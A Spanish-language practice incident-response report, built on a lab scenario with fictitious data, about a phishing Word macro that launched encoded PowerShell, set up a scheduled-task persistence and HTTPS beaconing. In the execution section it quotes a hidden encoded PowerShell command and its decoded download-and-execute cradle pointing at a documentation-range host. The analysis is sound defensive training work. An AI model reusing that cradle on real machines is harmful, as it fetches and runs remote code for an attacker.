# CASE-001 — PowerShell ofuscado desde un macro malicioso

> **Informe de práctica.** Caso construido sobre un escenario de laboratorio con
> datos ficticios e IPs de documentación (RFC 5737). El objetivo es practicar el
> flujo completo de respuesta: triage, análisis, evidencia y recomendaciones.

| Campo | Valor |
|---|---|
| Case ID | CASE-001 |
| Severidad | Alta |
| Estado | Cerrado (práctica) |
| Host afectado | `WS-042` |
| Cuenta | `jdoe` |

## Resumen ejecutivo

Un usuario abrió un documento de Word adjunto en un correo de phishing. El macro
ejecutó PowerShell ofuscado que descargó un segundo stage desde `203.0.113.45` y
estableció beaconing HTTPS cada 60 segundos. El endpoint `WS-042` quedó comprometido.
No se observó movimiento lateral.

## Alcance y línea de tiempo

| Hora (UTC) | Host | Cuenta | Evento |
|---|---|---|---|
| 09:12 | WS-042 | jdoe | Descarga de `invoice.docm` desde el correo |
| 09:14 | WS-042 | jdoe | `WINWORD.EXE` lanza `powershell.exe -enc ...` |
| 09:14 | WS-042 | jdoe | PowerShell contacta `203.0.113.45:443` |
| 09:16 | WS-042 | jdoe | Se crea la tarea programada `UpdaterCheck` |
| 09:17 | WS-042 | jdoe | Beaconing cada 60 s |
| 09:41 | WS-042 | jdoe | Alerta del EDR: PowerShell codificado |

## Análisis técnico

### Acceso inicial — T1566.001

Correo con adjunto `invoice.docm`. El usuario habilitó macros. El documento no tenía
firma válida ni relación con la operación normal de la organización.

### Ejecución — T1059.001

```
powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...
```

Decodificado:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.45/a')
```

El uso combinado de `-nop`, `-w hidden` y `-enc` con un proceso padre de Office es
el patrón que dispara la detección. Por separado, cada flag es común; juntos, en ese
contexto, no.

### Persistencia — T1053.005

Tarea programada `UpdaterCheck`, ejecutando PowerShell cada 15 minutos. El nombre
imita una tarea legítima de actualización, lo que la hace fácil de pasar por alto en
un listado rápido.

### Comando y control — T1071.001

HTTPS cada 60 segundos hacia `203.0.113.45`, con un JA3 poco común para el parque de
la organización. El intervalo fijo es en sí mismo una señal: el tráfico legítimo no
suele ser tan regular.

### Movimiento lateral

Sin evidencia. No se observaron logons tipo 3 ni 10 hacia otros hosts.

## Evidencia recolectada

| Evidencia | Fuente | Ubicación |
|---|---|---|
| Línea de comandos | Sysmon Event ID 1 | `C:\Users\jdoe\...` |
| Script block | PowerShell 4104 | `IEX ... DownloadString` |
| Creación de tarea | Security 4698 | `\UpdaterCheck` |
| PCAP | Zeek | `conn.log`, sesión a `203.0.113.45` |

## Indicadores de compromiso

| Tipo | Valor | Contexto |
|---|---|---|
| IP | `203.0.113.45` | C2 |
| Dominio | `update-check.example` | SNI |
| Tarea | `UpdaterCheck` | Persistencia |
| SHA-256 | `0000...` | Documento adjunto |

## Impacto

Un endpoint comprometido. Las credenciales de `jdoe` quedaron potencialmente
expuestas. No hay acceso confirmado a datos sensibles.

## Recomendaciones

1. Aislar `WS-042`, resetear credenciales de `jdoe` y revocar sesiones activas.
2. Bloquear IP y dominio en proxy y DNS.
3. Buscar `UpdaterCheck` y el mismo hash en todos los endpoints.
4. Bloquear macros en documentos que vienen de Internet (GPO).
5. Crear una regla de detección para `-enc` con proceso padre de Office.

## Mapeo MITRE ATT&CK

| Táctica | Técnica | Evidencia |
|---|---|---|
| Initial Access | T1566.001 | Adjunto `.docm` |
| Execution | T1059.001 | PowerShell codificado |
| Persistence | T1053.005 | Tarea `UpdaterCheck` |
| Command and Control | T1071.001 | Beaconing HTTPS |

## Lecciones

- **El orden importa.** Contener antes de analizar: mientras se investigaba el
  beaconing, el host seguía en la red.
- **Un solo indicador no es suficiente.** La IP sola no alcanza; la combinación de
  tarea + intervalo + padre del proceso es lo que sostiene la conclusión.
- **La detección se escribe después del caso.** La regla para `-enc` con padre de
  Office salió de este ejercicio, no de un listado genérico.
- **Los nombres "legítimos" son el problema.** `UpdaterCheck` pasaría un primer
  vistazo; por eso hay que mirar el binario y el padre, no el nombre.

## Próximos pasos (si fuera un caso real)

- Análisis de memoria del endpoint para recuperar el segundo stage.
- Revisión de correo para identificar otros destinatarios del mismo adjunto.
- Correlación en el SIEM de conexiones a `203.0.113.45` en los últimos 30 días.
